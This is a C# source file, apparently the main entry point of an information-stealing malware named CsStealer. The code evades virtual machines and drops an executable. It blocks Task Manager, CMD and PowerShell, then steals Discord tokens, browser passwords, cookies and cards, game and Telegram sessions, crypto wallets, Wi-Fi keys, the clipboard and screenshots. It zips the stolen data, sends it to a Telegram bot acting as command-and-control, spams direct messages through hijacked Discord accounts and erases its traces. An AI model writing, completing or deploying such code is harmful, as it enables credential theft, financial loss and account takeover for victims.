using System;
using System.IO.Compression;

namespace CsStealer
{
    class __Main__
    {
        public static volatile bool ReadyToClear = false;

        public static async Task Start(string[] Args)
        {
            Mutex _Mutex = new Mutex(initiallyOwned: true, "CST.Mutex", createdNew: out bool NotAlreadyRunning);

            if (!NotAlreadyRunning)
                Exit();

            if (Config.EnableAntiVM)
                await AntiVM.Check();

            if (Config.DropAnExecutable)
                await Dropper.Drop();

            string OutputDir = Config.OutputDir;

            Debugger.StartRawTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();

            if (!Directory.Exists(OutputDir))
            {
                Directory.CreateDirectory(OutputDir);
                Directory.CreateDirectory(Path.Combine(OutputDir, "System"));
            }
            else
            {
                Directory.Delete(OutputDir, true);
                Directory.CreateDirectory(OutputDir);
                Directory.CreateDirectory(Path.Combine(OutputDir, "System"));
            }

            Directory.CreateDirectory(OutputDir + "\\" + "Discord");

            if (Config.BlockApps)
            {
                Debugger.Debug("INFO", "Blocking TaskManager, CMD and Powershell");

                try
                {
                    Blockers.Start();
                }
                catch (Exception ex)
                {
                    Debugger.Debug("ERROR", $"An eror occured while blocking TaskManager, CMD and Powershell : {ex.Message}");
                }
            }

            Debugger.Debug("INFO", "Processing Discord tokens recovery");

            try
            {
                await DiscordRecovery.GetDiscordTokens();
                Debugger.Debug("INFO", "Ended Discord tokens recovery");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing Discord Tokens reocvery : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing browsers recovery (passwords;cookies;histories;cards;downloads)");
            Directory.CreateDirectory(Path.Combine(OutputDir, "Browsers Datas"));

            try
            {
                int ReturnCode = BrowsersRecovery.GetBrowsersDatas();

                if (ReturnCode != 0)
                    Debugger.Debug("ERROR", $"The browsers recovery wasn't a success");
                else
                    Debugger.Debug("ERROR", $"Ended browsers recovery");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"The browsers recovery wasn't a success : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing Tasklist recovery");

            try
            {
                SystemUtils.GetTasksList();
                Debugger.Debug("INFO", "Successfully retrieved the Tasklist");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing Tasklist recovery : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing System informations recovery");

            try
            {
                await SystemUtils.GetSystemInfos();
                Debugger.Debug("INFO", "Sucessfully terminated system informations recovery process");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing system infos recovery : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing files recovery");

            try
            {
                FileStealer.GetFiles();
                Debugger.Debug("INFO", "Sucessfully terminated files recovery");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing file recovery : {ex.Message}");
            }

            try
            {
                SystemUtils.GetClipboard();
                Debugger.Debug("INFO", "Sucessfully retrieved the clipboard");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while retrieving the clipboard : {ex.Message}");
            }

            try
            {
                Screenshot.GetScreenshot();
                Debugger.Debug("INFO", "Sucessfully saved a screenshot");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while saving the screenshot : {ex.Message}");
            }

            try
            {
                await DiscordRecovery.GetDiscordTokensAccountsDetails();
                Debugger.Debug("INFO", "Successfully saved Discord accounts details");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while retrieving Discord accounts details : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing sessions");

            Directory.CreateDirectory(Path.Combine(OutputDir, "Sessions"));

            Action[] SessionsFuncs = { Sessions.GetEpic, Sessions.GetSteam, Sessions.GetTelegram, Sessions.GetMinecraft, Sessions.GetUPlay, Sessions.GetRiot };

            foreach (Action Func in SessionsFuncs)
            {
                try
                {
                    Func();
                }
                catch { }
            }

            Debugger.Debug("INFO", "Processing crypto wallets recovery");

            Directory.CreateDirectory(Path.Combine(OutputDir, "Wallets"));

            try
            {
                Wallets.GetAllWallets();
                Debugger.Debug("INFO", "Sucessfully terminated wallets recovery");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing crypto wallets recovery : {ex.Message}");
            }

            Debugger.Debug("INFO", "Processing advanced/developper datas recovery");
            Debugger.Debug("INFO", "Saving environment variable : path");

            Directory.CreateDirectory(Path.Combine(OutputDir, "System", "Advanced & Developer"));

            try
            {
                OthersAdvanced.GetSystemPath();
                Debugger.Debug("INFO", "Sucessfully saved the system path");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while saving the system path : {ex.Message}");
            }

            try
            {
                OthersAdvanced.GetUserPath();
                Debugger.Debug("INFO", "Sucessfully saved the user path");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while saving the user path : {ex.Message}");
            }

            try
            {
                OthersAdvanced.GetProcessPath();
                Debugger.Debug("INFO", "Sucessfully saved the current process path");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while saving the current process path : {ex.Message}");
            }

            try
            {
                OthersAdvanced.GetPathesVars();
                Debugger.Debug("INFO", "Sucessfully saved the pathes environment variables");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while saving the pathes environment viariables : {ex.Message}");
            }

            try
            {
                OthersAdvanced.GetCurrentPorcessInfo(Args);
                Debugger.Debug("INFO", "Sucessfully retrieved the current process infos");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while retrieving the current process infos : {ex.Message}");
            }

            Debugger.Debug("INFO", "Starting Wifis recovery");

            try
            {
                WiFi.GetAllWifis();
                Debugger.Debug("INFO", "Sucessfully terminated wifi recovery");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while processing wifis recovery : {ex.Message}");
            }

            try
            {
                SystemUtils.GetWindowsProductKey();
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while retrieving Windows product key : {ex.Message}");
            }

            if (Config.AutoDiscordDMAll)
            {
                Debugger.Debug("INFO", "Starting Auto Discord DMAll for each tokens");

                try
                {
                    string[] Tokens = File.ReadAllLines(Path.Combine(OutputDir, "Discord", "Tokens.txt"));

                    foreach (string Token in Tokens)
                    {
                        Debugger.Debug("INFO", $"Starting with {Token}");
                        await DiscordDMall.Start(Token, Config.AutoDiscordDMAllMessageContent);
                    }
                }
                catch (Exception ex)
                {
                    Debugger.Debug("ERROR", "An error occured while processing Auto Discord DMAll : " + ex.Message);
                }
            }

            Debugger.Debug("INFO", $"CS Stealer finished processing\n\n[ END TIME : {DateTimeOffset.FromUnixTimeSeconds(DateTimeOffset.Now.ToUnixTimeSeconds())} ]");

            string? OutputDirName = Path.GetDirectoryName(OutputDir);

            try
            {
                if (File.Exists(Path.Combine(OutputDirName, $"CSLOG_{Environment.UserName}.zip")))
                {
                    File.Delete(Path.Combine(OutputDirName, $"CSLOG_{Environment.UserName}.zip"));
                }

                ZipFile.CreateFromDirectory(OutputDir, Path.Combine(OutputDirName, $"CSLOG_{Environment.UserName}.zip"), CompressionLevel.SmallestSize, includeBaseDirectory: false);
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"An error occured while creating the archive : {ex.Message}");
            }

            try
            {
                await FileUploader.SendDatas(Config.C2.TelegramBotToken, Config.C2.TelegramChatID, Path.Combine(OutputDirName, $"CSLOG_{Environment.UserName}.zip"));
            }
            catch {}

            while (!ReadyToClear)
                Thread.Sleep(100);

            try
            {
                Directory.Delete(OutputDir, recursive: true);
            }
            catch {}

            try
            {
                File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), $"CSLOG_{Environment.UserName}.zip"));
            }
            catch {}

            _Mutex.ReleaseMutex();
            _Mutex.Close();
        }

        private static void Exit() => Environment.Exit(0);
    }
}